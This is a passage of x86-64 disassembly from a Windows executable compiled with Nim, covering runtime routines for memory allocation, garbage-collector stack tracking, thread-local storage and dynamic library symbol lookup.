0000000000401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>:
  401c21:	53                   	push   %rbx
  401c22:	48 83 ec 30          	sub    $0x30,%rsp
  401c26:	48 89 d3             	mov    %rdx,%rbx
  401c29:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  401c2d:	49 89 cb             	mov    %rcx,%r11
  401c30:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401c35:	e8 ea fe ff ff       	call   401b24 <mappingInsert__SRLfEtcWb2dn0ht85HEwbQsystem>
  401c3a:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  401c3f:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401c44:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  401c4b:	00 
  401c4c:	48 89 c2             	mov    %rax,%rdx
  401c4f:	48 c1 e2 05          	shl    $0x5,%rdx
  401c53:	48 01 ca             	add    %rcx,%rdx
  401c56:	4d 8d 04 d3          	lea    (%r11,%rdx,8),%r8
  401c5a:	49 8b 90 78 10 00 00 	mov    0x1078(%r8),%rdx
  401c61:	48 85 d2             	test   %rdx,%rdx
  401c64:	48 89 53 10          	mov    %rdx,0x10(%rbx)
  401c68:	74 04                	je     401c6e <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA+0x4d>
  401c6a:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
  401c6e:	ba 01 00 00 00       	mov    $0x1,%edx
  401c73:	49 89 98 78 10 00 00 	mov    %rbx,0x1078(%r8)
  401c7a:	83 e1 1f             	and    $0x1f,%ecx
  401c7d:	48 89 d3             	mov    %rdx,%rbx
  401c80:	48 d3 e3             	shl    %cl,%rbx
  401c83:	89 c1                	mov    %eax,%ecx
  401c85:	41 09 9c 83 14 10 00 	or     %ebx,0x1014(%r11,%rax,4)
  401c8c:	00 
  401c8d:	83 e1 1f             	and    $0x1f,%ecx
  401c90:	48 d3 e2             	shl    %cl,%rdx
  401c93:	41 09 93 10 10 00 00 	or     %edx,0x1010(%r11)
  401c9a:	48 83 c4 30          	add    $0x30,%rsp
  401c9e:	5b                   	pop    %rbx
  401c9f:	c3                   	ret

0000000000401ca0 <GetThreadLocalVars.lto_priv.73>:
  401ca0:	56                   	push   %rsi
  401ca1:	53                   	push   %rbx
  401ca2:	48 83 ec 38          	sub    $0x38,%rsp
  401ca6:	8b 35 fc 7e 02 00    	mov    0x27efc(%rip),%esi        # 429ba8 <globalsSlot__ciXDZu9c27pHpCRMoz4RIgw>
  401cac:	ff 15 da 65 04 00    	call   *0x465da(%rip)        # 44828c <__imp_GetLastError>
  401cb2:	89 c3                	mov    %eax,%ebx
  401cb4:	89 f1                	mov    %esi,%ecx
  401cb6:	ff 15 60 66 04 00    	call   *0x46660(%rip)        # 44831c <__imp_TlsGetValue>
  401cbc:	89 d9                	mov    %ebx,%ecx
  401cbe:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401cc3:	ff 15 2b 66 04 00    	call   *0x4662b(%rip)        # 4482f4 <__imp_SetLastError>
  401cc9:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  401cce:	48 83 c4 38          	add    $0x38,%rsp
  401cd2:	5b                   	pop    %rbx
  401cd3:	5e                   	pop    %rsi
  401cd4:	c3                   	ret

0000000000401cd5 <nimGC_setStackBottom>:
  401cd5:	53                   	push   %rbx
  401cd6:	48 83 ec 20          	sub    $0x20,%rsp
  401cda:	48 89 cb             	mov    %rcx,%rbx
  401cdd:	e8 be ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  401ce2:	48 8b 48 38          	mov    0x38(%rax),%rcx
  401ce6:	48 85 c9             	test   %rcx,%rcx
  401ce9:	74 0c                	je     401cf7 <nimGC_setStackBottom+0x22>
  401ceb:	48 39 d9             	cmp    %rbx,%rcx
  401cee:	74 0b                	je     401cfb <nimGC_setStackBottom+0x26>
  401cf0:	48 39 cb             	cmp    %rcx,%rbx
  401cf3:	48 0f 4c d9          	cmovl  %rcx,%rbx
  401cf7:	48 89 58 38          	mov    %rbx,0x38(%rax)
  401cfb:	48 83 c4 20          	add    $0x20,%rsp
  401cff:	5b                   	pop    %rbx
  401d00:	c3                   	ret

0000000000401d01 <isOnStack__plOlFsQAAvcYd3nF5LfWzw>:
  401d01:	53                   	push   %rbx
  401d02:	48 83 ec 30          	sub    $0x30,%rsp
  401d06:	48 89 cb             	mov    %rcx,%rbx
  401d09:	e8 92 ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  401d0e:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
  401d13:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  401d1a:	00 00 
  401d1c:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  401d21:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401d26:	48 8b 50 38          	mov    0x38(%rax),%rdx
  401d2a:	31 c0                	xor    %eax,%eax
  401d2c:	48 39 d9             	cmp    %rbx,%rcx
  401d2f:	77 06                	ja     401d37 <isOnStack__plOlFsQAAvcYd3nF5LfWzw+0x36>
  401d31:	48 39 da             	cmp    %rbx,%rdx
  401d34:	0f 93 c0             	setae  %al
  401d37:	48 83 c4 30          	add    $0x30,%rsp
  401d3b:	5b                   	pop    %rbx
  401d3c:	c3                   	ret

0000000000401d3d <popSafePoint>:
  401d3d:	48 83 ec 28          	sub    $0x28,%rsp
  401d41:	e8 5a ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  401d46:	48 8b 50 20          	mov    0x20(%rax),%rdx
  401d4a:	48 8b 12             	mov    (%rdx),%rdx
  401d4d:	48 89 50 20          	mov    %rdx,0x20(%rax)
  401d51:	48 83 c4 28          	add    $0x28,%rsp
  401d55:	c3                   	ret

0000000000401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>:
  401d56:	56                   	push   %rsi
  401d57:	53                   	push   %rbx
  401d58:	48 83 ec 28          	sub    $0x28,%rsp
  401d5c:	48 89 ce             	mov    %rcx,%rsi
  401d5f:	e8 3c ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  401d64:	48 89 c3             	mov    %rax,%rbx
  401d67:	48 8b 46 08          	mov    0x8(%rsi),%rax
  401d6b:	48 8b 40 20          	mov    0x20(%rax),%rax
  401d6f:	48 85 c0             	test   %rax,%rax
  401d72:	74 14                	je     401d88 <prepareDealloc__fvhnFro5wEfzy879alizcUQ+0x32>
  401d74:	48 ff 83 98 00 00 00 	incq   0x98(%rbx)
  401d7b:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
  401d7f:	ff d0                	call   *%rax
  401d81:	48 ff 8b 98 00 00 00 	decq   0x98(%rbx)
  401d88:	48 83 c4 28          	add    $0x28,%rsp
  401d8c:	5b                   	pop    %rbx
  401d8d:	5e                   	pop    %rsi
  401d8e:	c3                   	ret

0000000000401d8f <stackSize__0yw8cp0rOgL8i0O5kzzb0g>:
  401d8f:	48 83 ec 28          	sub    $0x28,%rsp
  401d93:	e8 08 ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  401d98:	48 8d 48 38          	lea    0x38(%rax),%rcx
  401d9c:	48 83 c4 28          	add    $0x28,%rsp
  401da0:	e9 59 f8 ff ff       	jmp    4015fe <stackSize__VOU3z9bbtHMYBiCVB5tMX1g>

0000000000401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>:
  401da5:	48 83 ec 28          	sub    $0x28,%rsp
  401da9:	31 d2                	xor    %edx,%edx
  401dab:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
  401db1:	ff 15 8d 65 04 00    	call   *0x4658d(%rip)        # 448344 <__imp_VirtualFree>
  401db7:	85 c0                	test   %eax,%eax
  401db9:	75 17                	jne    401dd2 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6+0x2d>
  401dbb:	48 8d 0d 42 a2 00 00 	lea    0xa242(%rip),%rcx        # 40c004 <.rdata+0x4>
  401dc2:	e8 69 68 00 00       	call   408630 <printf>
  401dc7:	b9 01 00 00 00       	mov    $0x1,%ecx
  401dcc:	e8 6f 66 00 00       	call   408440 <exit>
  401dd1:	90                   	nop
  401dd2:	48 83 c4 28          	add    $0x28,%rsp
  401dd6:	c3                   	ret

0000000000401dd7 <rawWrite>:
  401dd7:	57                   	push   %rdi
  401dd8:	53                   	push   %rbx
  401dd9:	48 83 ec 28          	sub    $0x28,%rsp
  401ddd:	45 31 c0             	xor    %r8d,%r8d
  401de0:	48 85 d2             	test   %rdx,%rdx
  401de3:	48 89 cb             	mov    %rcx,%rbx
  401de6:	49 89 d2             	mov    %rdx,%r10
  401de9:	74 15                	je     401e00 <rawWrite+0x29>
  401deb:	48 89 d7             	mov    %rdx,%rdi
  401dee:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  401df2:	31 c0                	xor    %eax,%eax
  401df4:	f2 ae                	repnz scas (%rdi),%al
  401df6:	48 89 ca             	mov    %rcx,%rdx
  401df9:	48 f7 d2             	not    %rdx
  401dfc:	4c 8d 42 ff          	lea    -0x1(%rdx),%r8
  401e00:	4c 89 d1             	mov    %r10,%rcx
  401e03:	49 89 d9             	mov    %rbx,%r9
  401e06:	ba 01 00 00 00       	mov    $0x1,%edx
  401e0b:	e8 10 66 00 00       	call   408420 <fwrite>
  401e10:	48 89 d9             	mov    %rbx,%rcx
  401e13:	48 83 c4 28          	add    $0x28,%rsp
  401e17:	5b                   	pop    %rbx
  401e18:	5f                   	pop    %rdi
  401e19:	e9 1a 66 00 00       	jmp    408438 <fflush>

0000000000401e1e <nimRegisterGlobalMarker>:
  401e1e:	48 83 ec 28          	sub    $0x28,%rsp
  401e22:	48 8b 05 17 fd 01 00 	mov    0x1fd17(%rip),%rax        # 421b40 <globalMarkersLen>
  401e29:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
  401e2f:	7e 24                	jle    401e55 <nimRegisterGlobalMarker+0x37>
  401e31:	b9 02 00 00 00       	mov    $0x2,%ecx
  401e36:	ff 15 c4 92 00 00    	call   *0x92c4(%rip)        # 40b100 <__imp___acrt_iob_func>
  401e3c:	48 8d 15 d6 a1 00 00 	lea    0xa1d6(%rip),%rdx        # 40c019 <.rdata+0x19>
  401e43:	48 89 c1             	mov    %rax,%rcx
  401e46:	e8 8c ff ff ff       	call   401dd7 <rawWrite>
  401e4b:	b9 01 00 00 00       	mov    $0x1,%ecx
  401e50:	e8 eb 65 00 00       	call   408440 <exit>
  401e55:	48 8d 15 84 8f 01 00 	lea    0x18f84(%rip),%rdx        # 41ade0 <globalMarkers>
  401e5c:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
  401e60:	48 ff c0             	inc    %rax
  401e63:	48 89 05 d6 fc 01 00 	mov    %rax,0x1fcd6(%rip)        # 421b40 <globalMarkersLen>
  401e6a:	48 83 c4 28          	add    $0x28,%rsp
  401e6e:	c3                   	ret

0000000000401e6f <nimGetProcAddr>:
  401e6f:	41 56                	push   %r14
  401e71:	41 55                	push   %r13
  401e73:	41 54                	push   %r12
  401e75:	55                   	push   %rbp
  401e76:	57                   	push   %rdi
  401e77:	56                   	push   %rsi
  401e78:	53                   	push   %rbx
  401e79:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  401e80:	4c 8b 2d 0d 64 04 00 	mov    0x4640d(%rip),%r13        # 448294 <__imp_GetProcAddress>
  401e87:	49 89 cc             	mov    %rcx,%r12
  401e8a:	48 89 d5             	mov    %rdx,%rbp
  401e8d:	41 ff d5             	call   *%r13
  401e90:	48 85 c0             	test   %rax,%rax
  401e93:	0f 85 f9 00 00 00    	jne    401f92 <nimGetProcAddr+0x123>
  401e99:	48 8d 7c 24 26       	lea    0x26(%rsp),%rdi
  401e9e:	ba fa 00 00 00       	mov    $0xfa,%edx
  401ea3:	bb 01 00 00 00       	mov    $0x1,%ebx
  401ea8:	48 89 f9             	mov    %rdi,%rcx
  401eab:	e8 12 fb ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  401eb0:	c6 44 24 26 5f       	movb   $0x5f,0x26(%rsp)
  401eb5:	8a 44 1d ff          	mov    -0x1(%rbp,%rbx,1),%al
  401eb9:	84 c0                	test   %al,%al
  401ebb:	74 0f                	je     401ecc <nimGetProcAddr+0x5d>
  401ebd:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
  401ec0:	48 ff c3             	inc    %rbx
  401ec3:	48 81 fb f5 00 00 00 	cmp    $0xf5,%rbx
  401eca:	75 e9                	jne    401eb5 <nimGetProcAddr+0x46>
  401ecc:	c6 44 1c 26 40       	movb   $0x40,0x26(%rsp,%rbx,1)
  401ed1:	be 63 00 00 00       	mov    $0x63,%esi
  401ed6:	41 be 0a 00 00 00    	mov    $0xa,%r14d
  401edc:	48 8d 4e 9d          	lea    -0x63(%rsi),%rcx
  401ee0:	48 81 fe c6 00 00 00 	cmp    $0xc6,%rsi
  401ee7:	76 06                	jbe    401eef <nimGetProcAddr+0x80>
  401ee9:	48 83 c3 03          	add    $0x3,%rbx
  401eed:	eb 13                	jmp    401f02 <nimGetProcAddr+0x93>
  401eef:	48 8d 46 a6          	lea    -0x5a(%rsi),%rax
  401ef3:	48 83 f8 12          	cmp    $0x12,%rax
  401ef7:	76 06                	jbe    401eff <nimGetProcAddr+0x90>
  401ef9:	48 83 c3 02          	add    $0x2,%rbx
  401efd:	eb 03                	jmp    401f02 <nimGetProcAddr+0x93>
  401eff:	48 ff c3             	inc    %rbx
  401f02:	c6 44 1c 27 00       	movb   $0x0,0x27(%rsp,%rbx,1)
  401f07:	48 89 c8             	mov    %rcx,%rax
  401f0a:	31 d2                	xor    %edx,%edx
  401f0c:	49 f7 f6             	div    %r14
  401f0f:	48 89 c8             	mov    %rcx,%rax
  401f12:	83 c2 30             	add    $0x30,%edx
  401f15:	88 14 1f             	mov    %dl,(%rdi,%rbx,1)
  401f18:	48 99                	cqto
  401f1a:	48 ff cb             	dec    %rbx
  401f1d:	49 f7 fe             	idiv   %r14
  401f20:	48 85 c0             	test   %rax,%rax
  401f23:	48 89 c1             	mov    %rax,%rcx
  401f26:	75 df                	jne    401f07 <nimGetProcAddr+0x98>
  401f28:	48 89 fa             	mov    %rdi,%rdx
  401f2b:	4c 89 e1             	mov    %r12,%rcx
  401f2e:	41 ff d5             	call   *%r13
  401f31:	48 85 c0             	test   %rax,%rax
  401f34:	75 5c                	jne    401f92 <nimGetProcAddr+0x123>
  401f36:	48 83 c6 04          	add    $0x4,%rsi
  401f3a:	48 81 fe 2f 01 00 00 	cmp    $0x12f,%rsi
  401f41:	75 99                	jne    401edc <nimGetProcAddr+0x6d>
  401f43:	48 8b 1d b6 91 00 00 	mov    0x91b6(%rip),%rbx        # 40b100 <__imp___acrt_iob_func>
  401f4a:	b9 02 00 00 00       	mov    $0x2,%ecx
  401f4f:	ff d3                	call   *%rbx
  401f51:	48 8d 15 01 a1 00 00 	lea    0xa101(%rip),%rdx        # 40c059 <.rdata+0x59>
  401f58:	48 89 c1             	mov    %rax,%rcx
  401f5b:	e8 77 fe ff ff       	call   401dd7 <rawWrite>
  401f60:	b9 02 00 00 00       	mov    $0x2,%ecx
  401f65:	ff d3                	call   *%rbx
  401f67:	48 89 ea             	mov    %rbp,%rdx
  401f6a:	48 89 c1             	mov    %rax,%rcx
  401f6d:	e8 65 fe ff ff       	call   401dd7 <rawWrite>
  401f72:	b9 02 00 00 00       	mov    $0x2,%ecx
  401f77:	ff d3                	call   *%rbx
  401f79:	48 8d 15 ec a0 00 00 	lea    0xa0ec(%rip),%rdx        # 40c06c <.rdata+0x6c>
  401f80:	48 89 c1             	mov    %rax,%rcx
  401f83:	e8 4f fe ff ff       	call   401dd7 <rawWrite>
  401f88:	b9 01 00 00 00       	mov    $0x1,%ecx
  401f8d:	e8 ae 64 00 00       	call   408440 <exit>
  401f92:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  401f99:	5b                   	pop    %rbx
  401f9a:	5e                   	pop    %rsi
  401f9b:	5f                   	pop    %rdi
  401f9c:	5d                   	pop    %rbp
  401f9d:	41 5c                	pop    %r12
  401f9f:	41 5d                	pop    %r13
  401fa1:	41 5e                	pop    %r14
  401fa3:	c3                   	ret

0000000000401fa4 <nimLoadLibraryError>:
  401fa4:	56                   	push   %rsi
  401fa5:	53                   	push   %rbx
  401fa6:	48 83 ec 28          	sub    $0x28,%rsp
  401faa:	48 8b 1d 4f 91 00 00 	mov    0x914f(%rip),%rbx        # 40b100 <__imp___acrt_iob_func>
  401fb1:	48 89 ce             	mov    %rcx,%rsi
  401fb4:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fb9:	ff d3                	call   *%rbx
  401fbb:	48 8d 15 ac a0 00 00 	lea    0xa0ac(%rip),%rdx        # 40c06e <.rdata+0x6e>
  401fc2:	48 89 c1             	mov    %rax,%rcx
  401fc5:	e8 0d fe ff ff       	call   401dd7 <rawWrite>
  401fca:	48 89 f1             	mov    %rsi,%rcx
  401fcd:	e8 7f f5 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  401fd2:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fd7:	48 89 c6             	mov    %rax,%rsi
  401fda:	ff d3                	call   *%rbx
  401fdc:	48 89 f2             	mov    %rsi,%rdx
  401fdf:	48 89 c1             	mov    %rax,%rcx
  401fe2:	e8 f0 fd ff ff       	call   401dd7 <rawWrite>
  401fe7:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fec:	ff d3                	call   *%rbx
  401fee:	48 8d 15 77 a0 00 00 	lea    0xa077(%rip),%rdx        # 40c06c <.rdata+0x6c>
  401ff5:	48 89 c1             	mov    %rax,%rcx
  401ff8:	e8 da fd ff ff       	call   401dd7 <rawWrite>
  401ffd:	b9 01 00 00 00       	mov    $0x1,%ecx
  402002:	e8 39 64 00 00       	call   408440 <exit>
  402007:	90                   	nop

0000000000402008 <nimRegisterThreadLocalMarker>:
  402008:	48 83 ec 28          	sub    $0x28,%rsp
  40200c:	48 8b 05 ad 8d 01 00 	mov    0x18dad(%rip),%rax        # 41adc0 <threadLocalMarkersLen>
  402013:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
  402019:	7e 24                	jle    40203f <nimRegisterThreadLocalMarker+0x37>
  40201b:	b9 02 00 00 00       	mov    $0x2,%ecx
  402020:	ff 15 da 90 00 00    	call   *0x90da(%rip)        # 40b100 <__imp___acrt_iob_func>
  402026:	48 8d 15 52 a0 00 00 	lea    0xa052(%rip),%rdx        # 40c07f <.rdata+0x7f>
  40202d:	48 89 c1             	mov    %rax,%rcx
  402030:	e8 a2 fd ff ff       	call   401dd7 <rawWrite>
  402035:	b9 01 00 00 00       	mov    $0x1,%ecx
  40203a:	e8 01 64 00 00       	call   408440 <exit>
  40203f:	48 8d 15 1a 20 01 00 	lea    0x1201a(%rip),%rdx        # 414060 <threadLocalMarkers>
  402046:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
  40204a:	48 ff c0             	inc    %rax
  40204d:	48 89 05 6c 8d 01 00 	mov    %rax,0x18d6c(%rip)        # 41adc0 <threadLocalMarkersLen>
  402054:	48 83 c4 28          	add    $0x28,%rsp
  402058:	c3                   	ret

0000000000402059 <raiseOutOfMem__mMRdr4sgmnykA9aWeM9aDZlw>:
  402059:	48 83 ec 28          	sub    $0x28,%rsp
  40205d:	b9 02 00 00 00       	mov    $0x2,%ecx
  402062:	ff 15 98 90 00 00    	call   *0x9098(%rip)        # 40b100 <__imp___acrt_iob_func>
  402068:	48 8d 15 5c a0 00 00 	lea    0xa05c(%rip),%rdx        # 40c0cb <.rdata+0xcb>
  40206f:	48 89 c1             	mov    %rax,%rcx
  402072:	e8 60 fd ff ff       	call   401dd7 <rawWrite>
  402077:	b9 01 00 00 00       	mov    $0x1,%ecx
  40207c:	e8 bf 63 00 00       	call   408440 <exit>
  402081:	90                   	nop

0000000000402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>:
  402082:	48 83 ec 28          	sub    $0x28,%rsp
  402086:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  40208c:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  402092:	48 89 ca             	mov    %rcx,%rdx
  402095:	31 c9                	xor    %ecx,%ecx
  402097:	ff 15 9f 62 04 00    	call   *0x4629f(%rip)        # 44833c <__imp_VirtualAlloc>
  40209d:	48 85 c0             	test   %rax,%rax
  4020a0:	75 05                	jne    4020a7 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem+0x25>
  4020a2:	e8 b2 ff ff ff       	call   402059 <raiseOutOfMem__mMRdr4sgmnykA9aWeM9aDZlw>
  4020a7:	48 83 c4 28          	add    $0x28,%rsp
  4020ab:	c3                   	ret

00000000004020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>:
  4020ac:	56                   	push   %rsi
  4020ad:	53                   	push   %rbx
  4020ae:	48 83 ec 28          	sub    $0x28,%rsp
  4020b2:	48 8b b1 78 28 00 00 	mov    0x2878(%rcx),%rsi
  4020b9:	48 85 f6             	test   %rsi,%rsi
  4020bc:	48 89 cb             	mov    %rcx,%rbx
  4020bf:	74 05                	je     4020c6 <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg+0x1a>
  4020c1:	48 39 16             	cmp    %rdx,(%rsi)
  4020c4:	7d 39                	jge    4020ff <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg+0x53>
  4020c6:	b9 00 10 00 00       	mov    $0x1000,%ecx
  4020cb:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
  4020d0:	e8 ad ff ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  4020d5:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4020da:	48 89 83 78 28 00 00 	mov    %rax,0x2878(%rbx)
  4020e1:	48 81 83 80 28 00 00 	addq   $0x1000,0x2880(%rbx)
  4020e8:	00 10 00 00 
  4020ec:	48 89 70 10          	mov    %rsi,0x10(%rax)
  4020f0:	48 c7 00 e8 0f 00 00 	movq   $0xfe8,(%rax)
  4020f7:	48 c7 40 08 18 00 00 	movq   $0x18,0x8(%rax)
  4020fe:	00 
  4020ff:	48 8b 8b 78 28 00 00 	mov    0x2878(%rbx),%rcx
  402106:	4c 8b 41 08          	mov    0x8(%rcx),%r8
  40210a:	48 29 11             	sub    %rdx,(%rcx)
  40210d:	4e 8d 0c 01          	lea    (%rcx,%r8,1),%r9
  402111:	49 01 d0             	add    %rdx,%r8
  402114:	4c 89 41 08          	mov    %r8,0x8(%rcx)
  402118:	4c 89 c9             	mov    %r9,%rcx
  40211b:	e8 a2 f8 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  402120:	4c 89 c8             	mov    %r9,%rax
  402123:	48 83 c4 28          	add    $0x28,%rsp
  402127:	5b                   	pop    %rbx
  402128:	5e                   	pop    %rsi
  402129:	c3                   	ret

000000000040212a <add__3D9aOyz4rDquPZKBlqn0xig>:
  40212a:	56                   	push   %rsi
  40212b:	53                   	push   %rbx
  40212c:	48 83 ec 38          	sub    $0x38,%rsp
  402130:	48 89 d6             	mov    %rdx,%rsi
  402133:	48 8b 12             	mov    (%rdx),%rdx
  402136:	48 89 cb             	mov    %rcx,%rbx
  402139:	48 3b 12             	cmp    (%rdx),%rdx
  40213c:	74 08                	je     402146 <add__3D9aOyz4rDquPZKBlqn0xig+0x1c>
  40213e:	4c 39 42 10          	cmp    %r8,0x10(%rdx)
  402142:	76 78                	jbe    4021bc <add__3D9aOyz4rDquPZKBlqn0xig+0x92>
  402144:	eb 7c                	jmp    4021c2 <add__3D9aOyz4rDquPZKBlqn0xig+0x98>
  402146:	48 8b 81 c0 30 00 00 	mov    0x30c0(%rcx),%rax
  40214d:	48 85 c0             	test   %rax,%rax
  402150:	75 20                	jne    402172 <add__3D9aOyz4rDquPZKBlqn0xig+0x48>
  402152:	ba 28 00 00 00       	mov    $0x28,%edx
  402157:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  40215c:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  402161:	e8 46 ff ff ff       	call   4020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>
  402166:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  40216b:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
  402170:	eb 0a                	jmp    40217c <add__3D9aOyz4rDquPZKBlqn0xig+0x52>
  402172:	48 8b 10             	mov    (%rax),%rdx
  402175:	48 89 91 c0 30 00 00 	mov    %rdx,0x30c0(%rcx)
  40217c:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  402183:	00 
  402184:	4c 89 40 10          	mov    %r8,0x10(%rax)
  402188:	48 8d 93 d8 30 00 00 	lea    0x30d8(%rbx),%rdx
  40218f:	4c 89 48 18          	mov    %r9,0x18(%rax)
  402193:	75 0e                	jne    4021a3 <add__3D9aOyz4rDquPZKBlqn0xig+0x79>
  402195:	48 89 93 d8 30 00 00 	mov    %rdx,0x30d8(%rbx)
  40219c:	48 89 93 e0 30 00 00 	mov    %rdx,0x30e0(%rbx)
  4021a3:	48 89 10             	mov    %rdx,(%rax)
  4021a6:	48 89 50 08          	mov    %rdx,0x8(%rax)
  4021aa:	48 c7 40 20 01 00 00 	movq   $0x1,0x20(%rax)
  4021b1:	00 
  4021b2:	48 89 06             	mov    %rax,(%rsi)
  4021b5:	48 83 c4 38          	add    $0x38,%rsp
  4021b9:	5b                   	pop    %rbx
  4021ba:	5e                   	pop    %rsi
  4021bb:	c3                   	ret
  4021bc:	74 0c                	je     4021ca <add__3D9aOyz4rDquPZKBlqn0xig+0xa0>
  4021be:	48 83 c2 08          	add    $0x8,%rdx
  4021c2:	48 89 d9             	mov    %rbx,%rcx
  4021c5:	e8 60 ff ff ff       	call   40212a <add__3D9aOyz4rDquPZKBlqn0xig>
  4021ca:	48 89 f1             	mov    %rsi,%rcx
  4021cd:	e8 60 f5 ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  4021d2:	90                   	nop
  4021d3:	48 83 c4 38          	add    $0x38,%rsp
  4021d7:	5b                   	pop    %rbx
  4021d8:	5e                   	pop    %rsi
  4021d9:	e9 27 f5 ff ff       	jmp    401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>

00000000004021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>:
  4021de:	57                   	push   %rdi
  4021df:	56                   	push   %rsi
  4021e0:	53                   	push   %rbx
  4021e1:	48 83 ec 20          	sub    $0x20,%rsp
  4021e5:	4c 89 c6             	mov    %r8,%rsi
  4021e8:	48 89 d7             	mov    %rdx,%rdi
  4021eb:	49 89 c9             	mov    %rcx,%r9
  4021ee:	48 c1 fe 09          	sar    $0x9,%rsi
  4021f2:	48 89 f9             	mov    %rdi,%rcx
  4021f5:	4c 89 c3             	mov    %r8,%rbx
  4021f8:	48 89 f2             	mov    %rsi,%rdx
  4021fb:	e8 7f f6 ff ff       	call   40187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>
  402200:	48 85 c0             	test   %rax,%rax
  402203:	75 22                	jne    402227 <incl__tSnfTXv7GxXoDyFDm9bvzqg+0x49>
  402205:	ba 50 00 00 00       	mov    $0x50,%edx
  40220a:	4c 89 c9             	mov    %r9,%rcx
  40220d:	e8 9a fe ff ff       	call   4020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>
  402212:	40 0f b6 d6          	movzbl %sil,%edx
  402216:	48 8d 14 d7          	lea    (%rdi,%rdx,8),%rdx
  40221a:	48 8b 0a             	mov    (%rdx),%rcx
  40221d:	48 89 08             	mov    %rcx,(%rax)
  402220:	48 89 02             	mov    %rax,(%rdx)
  402223:	48 89 70 08          	mov    %rsi,0x8(%rax)
  402227:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
  40222d:	ba 01 00 00 00       	mov    $0x1,%edx
  402232:	49 89 d8             	mov    %rbx,%r8
  402235:	48 89 d9             	mov    %rbx,%rcx
  402238:	49 c1 f8 06          	sar    $0x6,%r8
  40223c:	48 d3 e2             	shl    %cl,%rdx
  40223f:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
  402244:	48 83 c4 20          	add    $0x20,%rsp
  402248:	5b                   	pop    %rbx
  402249:	5e                   	pop    %rsi
  40224a:	5f                   	pop    %rdi
  40224b:	c3                   	ret

000000000040224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>:
  40224c:	57                   	push   %rdi
  40224d:	56                   	push   %rsi
  40224e:	53                   	push   %rbx
  40224f:	48 83 ec 20          	sub    $0x20,%rsp
  402253:	4c 8b 52 08          	mov    0x8(%rdx),%r10
  402257:	49 8d 1c 10          	lea    (%r8,%rdx,1),%rbx
  40225b:	4d 29 c2             	sub    %r8,%r10
  40225e:	49 89 d1             	mov    %rdx,%r9
  402261:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
  402266:	4c 89 53 08          	mov    %r10,0x8(%rbx)
  40226a:	4c 8b 5a 08          	mov    0x8(%rdx),%r11
  40226e:	48 8d b9 a8 28 00 00 	lea    0x28a8(%rcx),%rdi
  402275:	48 89 ce             	mov    %rcx,%rsi
  402278:	4c 89 03             	mov    %r8,(%rbx)
  40227b:	48 89 f9             	mov    %rdi,%rcx
  40227e:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  402285:	00 
  402286:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  40228d:	00 
  40228e:	49 01 d3             	add    %rdx,%r11
  402291:	4c 89 da             	mov    %r11,%rdx
  402294:	48 c1 fa 0c          	sar    $0xc,%rdx
